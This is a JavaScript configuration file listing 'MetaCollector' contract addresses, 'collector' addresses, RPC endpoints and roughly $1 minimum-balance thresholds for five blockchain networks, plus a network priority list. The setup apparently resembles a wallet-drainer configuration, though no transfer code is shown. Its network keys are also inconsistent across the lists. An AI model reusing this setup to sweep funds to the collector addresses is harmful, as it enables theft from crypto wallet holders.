// MetaCollector contract addresses by network
export const METACOLLECTOR_CONTRACTS = {
  eth: {
    address: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    collector: '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824',
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    rpc: 'https://eth.llamarpc.com',
    explorer: 'https://etherscan.io',
    // $1 threshold in native currency (approximate)
    minBalance: 0.0004 // ~$1 at current prices
  },
  bsc: {
    address: '0x83B6e816e188D0361956C2c23fc4669b17A3E308',
    collector: '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824',
    chainId: 56,
    name: 'BNB Chain',
    currency: 'BNB',
    rpc: 'https://bsc-dataseed.binance.org',
    explorer: 'https://bscscan.com',
    minBalance: 0.002 // ~$1 at current prices
  },
  polygon: {
    address: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    collector: '0xDb30ac3997BCEBaB0E00cA4b1550b986ee2dFf81',
    chainId: 137,
    name: 'Polygon',
    currency: 'MATIC',
    rpc: 'https://polygon.llamarpc.com',
    explorer: 'https://polygonscan.com',
    minBalance: 1.5 // ~$1 at current prices
  },
  arbitrum: {
    address: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    collector: '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824',
    chainId: 42161,
    name: 'Arbitrum',
    currency: 'ETH',
    rpc: 'https://arb1.arbitrum.io/rpc',
    explorer: 'https://arbiscan.io',
    minBalance: 0.0004 // ~$1 at current prices
  },
  avalanche: {
    address: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    collector: '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824',
    chainId: 43114,
    name: 'Avalanche',
    currency: 'AVAX',
    rpc: 'https://api.avax.network/ext/bc/C/rpc',
    explorer: 'https://snowtrace.io',
    minBalance: 0.03 // ~$1 at current prices
  }
}

// Network priority (matches your backend)
export const NETWORK_PRIORITY = ['eth', 'arb', 'polygon', 'bnb', 'avax']

// Map chain IDs to network keys
export const CHAIN_ID_TO_NETWORK = {
  1: 'eth',
  56: 'bnb',
  137: 'polygon',
  42161: 'arb',
  10: 'optimism',
  43114: 'avax'
}

